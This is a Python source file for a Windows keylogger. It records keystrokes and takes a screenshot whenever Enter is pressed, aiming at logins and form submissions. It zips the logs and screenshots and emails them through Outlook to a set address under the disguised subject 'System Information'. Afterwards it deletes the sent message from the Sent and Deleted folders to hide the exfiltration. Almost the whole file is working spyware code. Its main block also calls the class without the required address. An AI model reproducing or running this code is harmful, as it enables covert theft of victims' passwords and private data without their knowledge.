from pynput import keyboard
import logging
import PIL.ImageGrab as shot
import time
from zipfile import ZipFile
import os
import win32com.client as win32
import sched


class Keylogger():

    def __init__(self, destination, time=None):
        """
        Initialize the Keylogger class

        :param destination : (String) Email address 
        :param time: (Int) Seconds

        """
        self.last_word = []                                 # Store last word collected.
        self.files = ["app.log"]                            # Keep track of files generated.
        self.destination = destination                      # Destination email address for receving the data
        self.seconds = time

        logging.basicConfig(
                    level=logging.INFO, 
                    filename="app.log", 
                    filemode="a",
                    format= "%(asctime)s - %(message)s"
                    )         
                    
    def start(self):
        if self.seconds:
            self.listener = keyboard.Listener(
                on_press=self._on_press, 
                on_release=self._on_release)
            self.listener.start()                                   # Starts the keyboard listener 
            self._scheduler()
        else:
            with keyboard.Listener(
                on_press=self._on_press,
                on_release=self._on_release) as listener:
                    listener.join()
       
    # --------------------------------- Private Methods --------------------------------
    def _scheduler(self): 
        """ 
        Set up a scheduled task to tun the self._logic method
        
        :param time: (int) Seconds
        """         
        schedule = sched.scheduler(time.time)
        schedule.enter(self.seconds,1,self._logic)                  # After time seconds, it starts the logic function
        schedule.run()                                              # Start the scheduler

    def _logic(self):
        self._compress_data()
        self._send_data()
        self._delete_email()
        self._delete_data()

    def _log(self,key,special=None):
        """
        Write a log into the app.log file.

        :param key: Keystroke
        :param special: (Boolean) Special or alphanumeric
        
        How this method works:
        First it checks whether the key given is special or alphanumeric. If it is
        indeed alphanumeric, it will just append it to the last_word list. 

        If the key is scpecial, it will then check whether it is the 'space' or 
        'enter' keys:
            - space: It will join the letters contained in last_word and log it into
                     the file.
            - enter: It will take a screenshot.

        The assumption is that every word is separated by space. Therefore, it makes
        sense to log it in that way for readability purposes. Also, another assumption
        has been made, that is, the user is more likely to press 'enter' when logging
        in to a website, submitting a form and so on and so forth. 
        
        """
        if special:
            if key is keyboard.Key.space:
                logging.info(f"{''.join(self.last_word)}")
                self.last_word = []
            elif key is keyboard.Key.enter:
                logging.info(f"{''.join(self.last_word)}")
                self.last_word = []
                logging.info(key)
                now = time.time()
                self._grab_screen(now)
            else:
                logging.info(f"{''.join(self.last_word)}")
                self.last_word = []
                logging.info(key)
        else:
            self.last_word.append(key)
            
    def _delete_data(self):
        """
        Once the code has compressed all previosly 
        gathered data, it will start to delete it.

        How this method works:

        The main idea behind it is to reduce the amount of data it has 
        collected by getting rid of the data it had just been compressed.
        
        Additioanlly, by performing this action, once 'compress_data' is
        called again, it won't compress data that was already compressed.
        """
        for f in self.files:
            os.remove(f)
        
    def _compress_data(self):
        """
        Compress data collected into a zip file.
        This method compress the app.log alongsided all the screenshots 
        the program has taken.
        """
        logging.shutdown()                               # First, we need to stop logging otherwise the app.log file will not be deleted.
        
        with ZipFile("collected.zip", "w") as myzip:
            for f in self.files:
                myzip.write(f)                           # Compress all files generated into a zip file.
        
        self.files.append("collected.zip")               # Add the zip file to the list in order to be deleted

    def _send_data(self):
        "Send data via email to an specific email address"
        
        outlook = win32.Dispatch("outlook.application")
        mail = outlook.CreateItem(0)
        mail.To = self.destination
        mail.Subject = "System Information"
        mail.HTMLBody = "Your message"
        
        path = os.getcwd()
        attachment = f"{path}\collected.zip"
        mail.Attachments.Add(attachment)
        mail.Send()

    def _delete_email(self):
        """
        Delete the email sent from the user's inbox
        
        :param destination: (String) Destination email address
        """
        outlook = win32.Dispatch("outlook.application").GetNamespace("MAPI")

        sent = outlook.GetDefaultFolder(5)
        deleted = outlook.GetDefaultFolder(3)

        deleted = deleted.Items
        sent = sent.Items

        deleted_len = len(deleted) 
        sent_len = len(sent)

        if sent_len != 0:
            for x in range(sent_len, sent_len-5, -1):
                message = sent(x)
                if message.to == self.destination:
                    message.Delete()

        if deleted_len != 0:
            for x in range(deleted_len, deleted_len-5, -1):
                try:
                    message = deleted(x)
                    if message.to == self.destination:
                        message.Delete()
                except: 
                    pass
                    
    def _on_press(self,key):
        try:
            print(f"{key.char} pressed")
            self._log(key.char)
        except AttributeError:
            print(f"Special key {key}")
            self._log(key, True)

    def _on_release(self,key):
        if key == keyboard.Key.esc:
            # Stop listener
            return False

    def _grab_screen(self, name):
        """
        Take a screenshot of the current screen.

        :param name: (float) Name for the file. This one corresponds
                     to the time generated by utcnow()

        """
        now = str(name).split(".")      # Take only the seconds
        img = shot.grab()               # Grab the screenshot
        name = f"Shot-{now[0]}.png"     # Prepare the name for the file
        img.save(name)                  # Save the file to the current directory
        self.files.append(name)         # Append the name to the files list.

if __name__ == "__main__":
    klogger = Keylogger()
    klogger.start()
    
